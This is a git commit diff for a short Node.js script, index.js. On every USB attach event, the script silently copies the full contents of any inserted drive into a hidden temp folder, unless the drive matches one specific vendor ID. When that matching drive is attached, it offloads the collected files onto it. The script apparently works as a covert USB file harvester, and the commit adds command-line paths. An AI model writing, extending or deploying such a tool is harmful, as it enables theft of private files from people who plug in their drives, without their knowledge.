33998de693394396c5afbc7d15f8774a0691cac7
rbxluau <131898898+rbxluau@users.noreply.github.com>
2025-03-16 05:09:07 +0800

    Pull

--- index.js
+++ index.js
@@ -1,14 +1,20 @@
 import {usb} from "usb"
 import fs from "fs"
 
+let args = ["F:/", "D:/Temp/", "F:/Backup/"], info = null
+
+process.argv.slice(2, 5).forEach((arg, index) => {
+    args[index] = arg
+})
+
 usb.on("attach", (device) => {
-    if (fs.existsSync("F:/")) {
-        const info = device.deviceDescriptor
+    if (fs.existsSync(args[0])) {
+        info = device.deviceDescriptor
         if (info.idVendor !== 0x0781 && info.idProduct !== 0x5591) {
-            fs.cpSync("F:/", "D:/Temp/"+crypto.randomUUID(), {recursive: true})
+            fs.cpSync(args[0], args[1]+crypto.randomUUID(), {recursive: true})
         }
-        else if (fs.existsSync("D:/Temp")) {
-            fs.cpSync("D:/Temp", "F:/Backup", {recursive: true})
+        else if (fs.existsSync(args[1])) {
+            fs.cpSync(args[1], args[2], {recursive: true})
         }
     }
 })
